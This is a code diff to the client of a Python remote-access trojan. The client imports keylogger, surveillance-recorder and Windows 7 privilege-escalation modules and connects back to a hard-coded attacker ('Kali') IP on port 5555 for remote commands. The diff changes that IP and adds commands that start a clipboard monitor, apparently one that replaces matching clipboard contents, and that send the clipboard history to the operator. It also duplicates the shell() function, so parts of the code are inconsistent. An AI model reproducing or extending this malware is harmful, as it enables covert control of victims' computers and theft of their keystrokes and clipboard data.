@@ -27,6 +27,12 @@ if current_dir not in sys.path:
 from features.keylogger import create_keylogger
 from features.recording import create_surveillance_recorder
 from features.privilege import Windows7PrivilegeEscalator
+from features.clipboard import (
+    start_clipboard_monitor,
+    print_clipboard_history,
+    clipboard_history,
+    PATTERNS
+)
 
 
 # Function to send data in a reliable way (encoded as JSON)
@@ -52,7 +58,7 @@ def connection():
         time.sleep(20)  # Wait for 20 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host - CHANGE THIS IP TO YOUR KALI LINUX IP
-            s.connect(('192.168.56.104', 5555))  # Update this to your Kali IP
+            s.connect(('192.168.1.144', 5555))  # Update this to your Kali IP
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -243,6 +249,47 @@ def shell():
             except Exception as e:
                 reliable_send("Command execution error: " + str(e))
 
+
+def shell():
+    global keylogger, recorder, privilege_escalator
+
+    clipboard_monitor_started = False
+
+    while True:
+        command = reliable_recv()
+        
+        if command == 'quit':
+            break
+        elif command == 'clear':
+            pass
+        elif command[:3] == 'cd ':
+            try:
+                os.chdir(command[3:])
+                reliable_send("Directory changed successfully")
+            except Exception as e:
+                reliable_send("Error changing directory: " + str(e))
+
+        # --- CLIPBOARD COMMANDS ---
+        elif command == 'start_clipboard':
+            try:
+                if not clipboard_monitor_started:
+                    start_clipboard_monitor(replace=True, patterns=PATTERNS)
+                    clipboard_monitor_started = True
+                    reliable_send("Clipboard monitor started")
+                else:
+                    reliable_send("Clipboard monitor already running")
+            except Exception as e:
+                reliable_send("Clipboard monitor error: " + str(e))
+
+        elif command == 'clipboard_history':
+            try:
+                if clipboard_history:
+                    history_str = "\n".join(f"{i+1}: {entry}" for i, entry in enumerate(clipboard_history))
+                    reliable_send("Clipboard History:\n" + history_str)
+                else:
+                    reliable_send("Clipboard history is empty")
+            except Exception as e:
+                reliable_send("Clipboard history error: " + str(e))
 
 # Create a socket object for communication over IPv4 and TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
